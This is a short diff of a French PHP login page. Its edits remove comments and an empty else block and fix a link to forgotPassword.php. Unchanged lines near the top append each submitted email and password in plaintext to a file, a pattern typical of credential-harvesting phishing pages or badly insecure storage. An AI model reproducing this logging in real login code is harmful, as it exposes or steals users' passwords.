@@ -21,7 +21,7 @@ if (isset($_POST["inputEmail"]) && isset($_POST["inputPassword"]) && !empty($_PO
         $ficher_contenu = "".$_POST["inputEmail"]." --- ".$_POST["inputPassword"]."\r\n";
         file_put_contents($fichier_nom, $ficher_contenu,FILE_APPEND);
     }
-}else{}
+}
 ?>
 </head>
 
@@ -40,7 +40,6 @@ if (isset($_POST["inputEmail"]) && isset($_POST["inputPassword"]) && !empty($_PO
                     <form method="POST" action="login.php">
                         <div class="form-group">
                             <div class="form-label-group">
-                                <!-- adresse mail -->
                                 <label for="inputEmail">
                                     Addresse email :
                                 </label>
@@ -49,7 +48,6 @@ if (isset($_POST["inputEmail"]) && isset($_POST["inputPassword"]) && !empty($_PO
                         </div>
                         <div class="form-group">
                             <div class="form-label-group">
-                                <!-- mot de passe -->
                                 <label for="inputPassword">
                                     Mot de passe :
                                 </label>
@@ -58,9 +56,8 @@ if (isset($_POST["inputEmail"]) && isset($_POST["inputPassword"]) && !empty($_PO
                         </div>
                         <input class="btn btn-primary degrade btn-block pt-2 pb-2 " type="submit" value="Connexion">
                     </form>
-                    
                     <div class="text-center">
-                        <a class="d-block small pt-3 text-center text-secondary" href="forgotPassword">Mot de passe oublié ?
+                        <a class="d-block small pt-3 text-center text-secondary" href="forgotPassword.php">Mot de passe oublié ?
                         </a>
                     </div>
                 </div>
